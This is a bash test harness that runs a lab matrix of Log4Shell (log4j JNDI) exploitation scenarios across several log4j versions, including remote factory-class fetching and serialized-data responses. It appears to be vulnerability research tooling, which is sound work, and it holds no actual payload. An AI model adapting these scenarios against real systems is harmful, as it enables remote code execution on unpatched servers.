#!/usr/bin/env bash
# Exploitability matrix. Every line is a measured result, not a claim from an advisory.
#
#   row 1: payload in the log message, factory class fetched from the attacker server
#   row 2: payload in the log message, factory class already on the victim classpath
#   row 3: payload in the Thread Context Map, javaSerializedData response
#   row 4: same as row 3 but with log4j2.enableJndi* turned on
set -uo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT"

VERSIONS="${VERSIONS:-2.14.1 2.15.0 2.16.0 2.17.1 2.24.0 2.25.1 2.26.1}"
ENABLE="-Dlog4j2.enableJndi=true -Dlog4j2.enableJndiLookup=true"

echo "### JDK ${JDK:-/usr/lib/jvm/java-8-openjdk-amd64} | trustURLCodebase+trustSerialData enabled"
for v in $VERSIONS; do
    ./lab/run.sh "$v" codebase  log | head -1
    ./lab/run.sh "$v" classpath log | head -1
    ./lab/run.sh "$v" serialized ctx | head -1
    ./lab/run.sh "$v" serialized ctx "$ENABLE" | head -1
done
